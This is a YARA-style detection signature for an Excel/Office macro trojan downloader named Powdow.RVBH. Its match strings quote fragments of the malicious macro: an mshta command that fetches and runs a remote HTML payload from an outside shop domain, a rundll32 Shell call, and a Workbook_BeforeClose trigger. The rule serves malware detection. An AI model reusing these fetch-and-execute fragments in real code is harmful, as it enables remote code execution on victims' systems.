
rule TrojanDownloader_O97M_Powdow_RVBH_MTB{
	meta:
		description = "TrojanDownloader:O97M/Powdow.RVBH!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_01_0 = {77 2e 72 75 6e 28 5c 22 22 6d 73 68 74 61 25 32 30 68 74 74 70 3a 2f 2f 77 77 77 2e 63 6f 61 6c 6d 69 6e 6e 65 72 73 2e 73 68 6f 70 2f 70 2f 31 38 2e 68 74 6d 6c 5c 22 22 } //1 w.run(\""mshta%20http://www.coalminners.shop/p/18.html\""
		$a_01_1 = {43 61 6c 6c 20 53 68 65 6c 6c 21 28 22 72 75 6e 64 6c 6c 33 32 20 22 20 2b 20 6b 75 6c 61 62 65 61 72 29 } //1 Call Shell!("rundll32 " + kulabear)
		$a_01_2 = {53 75 62 20 57 6f 72 6b 62 6f 6f 6b 5f 42 65 66 6f 72 65 43 6c 6f 73 65 } //1 Sub Workbook_BeforeClose
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=3
 
}